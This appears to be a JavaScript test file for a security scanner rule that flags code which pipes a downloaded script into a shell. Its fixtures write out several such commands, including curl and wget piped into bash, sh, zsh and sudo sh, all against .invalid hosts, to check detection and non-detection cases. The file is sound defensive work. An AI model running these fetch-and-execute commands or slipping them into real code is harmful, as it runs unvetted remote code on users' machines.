// A project's own code that runs a download piped into a shell (SC-PIPE-SHELL;
// twin of python/tests/scanner/test_review_pipe_shell.py). The line test is
// lib/shellpipe.js runsDownloadThroughShell (core._runs_download_through_shell);
// a dependency's code gets the import-time test instead (SC-IMPORT-RISK).
// Payloads are inert text: hosts are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { scanFile } from "../src/index.js";

const CURL_JS = 'const { execSync } = require("child_process");\nexecSync("curl -s https://collector.invalid/x | bash");\n';
const MSG = "Code runs a downloaded script through a shell.";
const found = (content, lang = "js", dep = false) => scanFile({ path: "x." + lang, content, lang, dep })
  .filter((i) => i.rule === "SC-PIPE-SHELL" || i.rule === "SC-IMPORT-RISK").map((i) => [i.rule, i.sev, i.line, i.msg]);

test("first-party code that runs a download piped into a shell", () => {
  for (const [lang, text, line] of [
    ["js", CURL_JS, 2],
    ["js", "cp.exec(`wget -qO- ${url} | sudo sh`, done);\n", 1],
    ["py", "import subprocess\nsubprocess.run('curl -fsSL https://files.invalid/i.sh | sh', shell=True)\n", 2],
    ["py", 'os.system("wget -qO- https://files.invalid/i.sh|bash")\n', 1],
    ["js", "spawn('sh', ['-c', 'curl -s https://files.invalid/x | zsh']);\n", 1],
  ]) assert.deepEqual(found(text, lang), [["SC-PIPE-SHELL", "MAJOR", line, MSG]], text);
  assert.deepEqual(found('execSync("curl -s https://files.invalid/x | bash"); // nosec\n'), [["SC-PIPE-SHELL", "MAJOR", 1, MSG]]);
});

test("not a download run through a shell; not in a dependency", () => {
  for (const [lang, text] of [
    ["js", "console.log('Install with: curl -fsSL https://sh.invalid/i.sh | sh');\n"],
    ["js", "// execSync('curl https://files.invalid/x | sh')\n"],
    ["py", "# os.system('curl https://files.invalid/x | sh')\n"],
    ["js", "execSync('curl -o x.tgz https://files.invalid/x.tgz; sh build.sh');\n"],
    ["js", "execSync('curl -s https://files.invalid/x | tee log');\n"],
    ["py", "run(['curl', '-o', 'x', url])\n"],
  ]) assert.deepEqual(found(text, lang), [], text);
  assert.deepEqual(found(CURL_JS, "js", true), []);
});
